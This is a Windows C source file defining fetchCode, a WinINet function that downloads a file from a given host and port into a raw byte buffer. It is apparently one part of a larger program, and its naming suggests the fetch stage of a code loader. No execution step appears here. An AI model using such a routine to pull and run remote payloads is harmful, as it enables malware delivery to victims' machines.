#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <stdlib.h>

#include "GetterFunctions.h"

#pragma comment(lib, "wininet.lib")

int fetchCode(wchar_t hostname[], wchar_t file[], wchar_t port[], unsigned char** buffer, DWORD* size) {
    DWORD bytesRead;
    DWORD totalBytesRead = 0;
    DWORD contentLength = 0;

    wchar_t url[4096];
    swprintf(url, 4096, L"http://%ls:%ls/%ls", hostname, port, file);
    wprintf(L"URL: %ls\n", url);

    SetLastError(0);
    HINTERNET hInternet = InternetOpen(L"User Agent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL) {
        printf("InternetOpen failed. Error: %d\n", GetLastError());
        return -1;
    }

    SetLastError(0);
    HINTERNET hConnect = InternetOpenUrl(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (hConnect == NULL) {
        printf("InternetOpenUrl failed. Error: %d\n", GetLastError());
        InternetCloseHandle(hInternet);
        return -1;
    }

    SetLastError(0);
    if (!InternetQueryDataAvailable(hConnect, &contentLength, 0, 0)) {
        printf("InternetQueryDataAvailable failed. Error: %d\n", GetLastError());
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return -1;
    }

    *buffer = (unsigned char*)malloc(contentLength);
    if (*buffer == NULL) {
        printf("Memory allocation failed.\n");
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return -1;
    }
    *size = contentLength;

    while (InternetReadFile(hConnect, *buffer + totalBytesRead, contentLength - totalBytesRead, &bytesRead) && bytesRead > 0) {
        totalBytesRead += bytesRead;
    }

    if (GetLastError() != ERROR_SUCCESS) {
        printf("InternetReadFile failed. Error: %d\n", GetLastError());
    }

    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    return (totalBytesRead > 0) ? 0 : -1;
}
